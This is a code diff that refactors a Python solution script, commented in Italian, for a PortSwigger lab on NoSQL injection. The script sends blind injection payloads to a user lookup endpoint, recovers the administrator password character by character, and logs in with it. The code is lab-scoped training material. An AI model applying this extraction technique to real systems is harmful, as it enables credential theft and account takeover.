@@ -1,43 +1,25 @@
 """
     RISOLUZIONE DEL LAB: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
 """
-import requests
 import sys
+from base_exploit import BaseNoSQLExploit, print_error, print_success, print_info
 
-try:
-    from colorama import init, Fore, Style
-    init(autoreset=True)
-except Exception:
-    class Fore:
-        RED = ''
-        GREEN = ''
-        YELLOW = ''
-        BLUE = ''
-        CYAN = ''
-        MAGENTA = ''
-    class Style:
-        RESET_ALL = ''
-
-def colored(text, color):
-    return f"{color}{text}{Style.RESET_ALL}"
-
-def print_error(msg):
-    print(colored(msg, Fore.RED))
-
-def print_success(msg):
-    print(colored(msg, Fore.GREEN))
-
-def print_info(msg):
-    print(colored(msg, Fore.CYAN))
-
-LAB_ID = "INSERT_YOUR_LAB_ID_HERE"  
+# ==================== CONFIGURAZIONE ====================
+LAB_ID = "INSERT_YOUR_LAB_ID_HERE"
 BASE_URL = f"https://{LAB_ID}.web-security-academy.net"
 
-class NoSQLInjectionExploit:
+# ==================== COSTANTI ====================
+LOOKUP_ENDPOINT = "/user/lookup"
+EMPTY_RESPONSE_THRESHOLD = 38  # Threshold per risposta vuota (da analisi ZAProxy)
+CHARSET = "abcdefghijklmnopqrstuvwxyz"
+PASSWORD_LENGTH_RANGES = [(1, 10), (10, 20), (20, 30), (30, 40)]
+
+# ==================== EXPLOIT CLASS ====================
+class InjToExtractData(BaseNoSQLExploit):
+    """Exploit per NoSQL Injection Data Extraction."""
+    
     def __init__(self, lab_id):
-        self.lab_id = lab_id
-        self.base_url = f"https://{lab_id}.web-security-academy.net"
-        self.session = requests.Session()
+        super().__init__(lab_id)
         self.password = ""
         
     def check_lab_status(self):
@@ -53,17 +35,23 @@ class NoSQLInjectionExploit:
             print_error(f"Errore connessione: {e}")
             return False
     
+    def _get_csrf_token(self, url):
+        """Estrae il token CSRF da una pagina."""
+        import re
+        try:
+            response = self.session.get(url, timeout=10)
+            csrf_match = re.search(r'name="csrf" value="([^"]+)"', response.text)
+            return csrf_match.group(1) if csrf_match else ""
+        except Exception as e:
+            print_error(f"Errore estrazione CSRF token: {e}")
+            return ""
+    
     def login(self, username="wiener", password="peter"):
-        """Effettua il login per ottenere una sessione valida"""
+        """Effettua il login per ottenere una sessione valida."""
         print_info(f"\nLogin con {username}:{password}")
         
-        #prima otteniamo il token CSRF dalla pagina di login
-        login_page = self.session.get(f"{self.base_url}/login", timeout=10)
-        
-        #estrai il CSRF token dalla pagina
-        import re
-        csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
-        csrf_token = csrf_match.group(1) if csrf_match else ""
+        # Ottieni token CSRF dalla pagina di login
+        csrf_token = self._get_csrf_token(self.login_url)
         
         login_data = {
             "csrf": csrf_token,
@@ -72,7 +60,7 @@ class NoSQLInjectionExploit:
         }
         
         response = self.session.post(
-            f"{self.base_url}/login",
+            self.login_url,
             data=login_data,
             allow_redirects=True,
             timeout=10
@@ -85,39 +73,43 @@ class NoSQLInjectionExploit:
             print_error(f"Login fallito")
             return False
     
-    def check_password_length(self, username="administrator"):
-        """Determina la lunghezza della password"""
-        print_info(f"\nRicerca lunghezza password per {username}")
-
-        ranges = [(1, 10), (10, 20), (20, 30), (30, 40)]
+    def _test_password_condition(self, username, condition):
+        """Testa una condizione sulla password tramite NoSQL injection.
         
-        for range_start, range_end in ranges:
-            #controlla se la lunghezza è minore del limite superiore
-            payload = f"{username}' & this.password.length < {range_end} || 'a'=='b"
-            
-            params = {"user": payload}
+        Returns:
+            bool: True se la condizione è soddisfatta (risposta non vuota)
+        """
+        payload = f"{username}' & {condition} || 'a'=='b"
+        params = {"user": payload}
+        
+        try:
             response = self.session.get(
-                f"{self.base_url}/user/lookup",
+                f"{self.base_url}{LOOKUP_ENDPOINT}",
                 params=params,
                 timeout=10
             )
+            # Risposta > threshold indica condizione vera (da analisi ZAProxy)
+            return response.status_code == 200 and len(response.text) > EMPTY_RESPONSE_THRESHOLD
+        except Exception as e:
+            print_error(f"Errore durante test condizione: {e}")
+            return False
+    
+    def check_password_length(self, username="administrator"):
+        """Determina la lunghezza della password usando binary search su range."""
+        print_info(f"\nRicerca lunghezza password per {username}")
+        
+        # Ricerca binaria per trovare il range corretto
+        for range_start, range_end in PASSWORD_LENGTH_RANGES:
+            condition = f"this.password.length < {range_end}"
             
-            #se content length > 38, la lunghezza è minore di range_end (ha dato risposta sbagliata -> visto da zaproxy)
-            if response.status_code == 200 and len(response.text) > 38:
+            if self._test_password_condition(username, condition):
                 print_info(f"Lunghezza password < {range_end}, ricerca in range {range_start}-{range_end-1}")
                 
-                #prova dal più alto al più basso in questo range (9,8...1)
+                # Ricerca esatta nel range (dal più alto al più basso)
                 for length in range(range_end - 1, range_start - 1, -1):
-                    payload = f"{username}' & this.password.length == {length} || 'a'=='b"
+                    condition = f"this.password.length == {length}"
                     
-                    params = {"user": payload}
-                    response = self.session.get(
-                        f"{self.base_url}/user/lookup",
-                        params=params,
-                        timeout=10
-                    )
-                    
-                    if response.status_code == 200 and len(response.text) > 38:
+                    if self._test_password_condition(username, condition):
                         print_success(f"Lunghezza password trovata: {length}")
                         return length
         
@@ -125,7 +117,7 @@ class NoSQLInjectionExploit:
         return None
     
     def extract_password(self, username="administrator", length=None):
-        """Estrae la password carattere per carattere"""
+        """Estrae la password carattere per carattere usando NoSQL injection."""
         if length is None:
             length = self.check_password_length(username)
             if length is None:
@@ -134,24 +126,16 @@ class NoSQLInjectionExploit:
         print_info(f"\nEstrazione password per {username} (lunghezza: {length})")
         
         password = ""
-        charset = "abcdefghijklmnopqrstuvwxyz"
         
         for position in range(length):
             found = False
             print_info(f"\nRicerca carattere in posizione {position}")
             
-            for char in charset:
-                payload = f"{username}' & this.password[{position}] == '{char}' || 'a'=='b"
+            # Prova ogni carattere del charset
+            for char in CHARSET:
+                condition = f"this.password[{position}] == '{char}'"
                 
-                params = {"user": payload}
-                response = self.session.get(
-                    f"{self.base_url}/user/lookup",
-                    params=params,
-                    timeout=10
-                )
-                
-                # Se content length > 38, la condizione è vera (carattere corretto) (visto da zaproxy)
-                if response.status_code == 200 and len(response.text) > 38:
+                if self._test_password_condition(username, condition):
                     password += char
                     print_success(f"Carattere trovato: {char} -> Password parziale: {password}")
                     found = True
@@ -165,14 +149,11 @@ class NoSQLInjectionExploit:
         return password
     
     def solve_lab(self, extracted_password):
-        """Effettua il login come administrator per completare il lab"""
+        """Effettua il login come administrator per completare il lab."""
         print_info(f"\nLogin come administrator con password: {extracted_password}")
         
-        # Ottieni nuovo CSRF token
-        login_page = self.session.get(f"{self.base_url}/login", timeout=10)
-        import re
-        csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
-        csrf_token = csrf_match.group(1) if csrf_match else ""
+        # Ottieni nuovo CSRF token usando metodo della classe base
+        csrf_token = self.get_csrf_token(self.login_url)
         
         login_data = {
             "csrf": csrf_token,
@@ -181,7 +162,7 @@ class NoSQLInjectionExploit:
         }
         
         response = self.session.post(
-            f"{self.base_url}/login",
+            self.login_url,
             data=login_data,
             allow_redirects=True,
             timeout=10
@@ -196,25 +177,27 @@ class NoSQLInjectionExploit:
             return False
    
 def main():
-    if LAB_ID == "YOUR_LAB_ID_HERE":
-        print_error("\nERRORE: Devi impostare il LAB_ID nello script!")
-        print_info("Esempio: LAB_ID = '0a12003404bd3fe180f562b700ab0012'")
+    """Funzione principale per l'esecuzione dell'exploit."""
+    # Validazione configurazione
+    if not BaseNoSQLExploit.validate_lab_id(LAB_ID):
         sys.exit(1)
     
-    exploit = NoSQLInjectionExploit(LAB_ID)
+    exploit = InjToExtractData(LAB_ID)
     
+    # Verifica connettività
     if not exploit.check_lab_status():
         sys.exit(1)
     
-    #1: Login come wiener per ottenere una sessione valida
+    # FASE 1: Login come wiener per ottenere una sessione valida
     if not exploit.login("wiener", "peter"):
         print_error("Impossibile effettuare il login")
         sys.exit(1)
-    #2: Estrai la password dell'administrator
+    
+    # FASE 2: Estrai la password dell'administrator tramite NoSQL injection
     password = exploit.extract_password("administrator")
     
     if password:
-        #3: Login come administrator per completare il lab
+        # FASE 3: Login come administrator per completare il lab
         exploit.solve_lab(password)
     else:
         print_error("Impossibile estrarre la password")
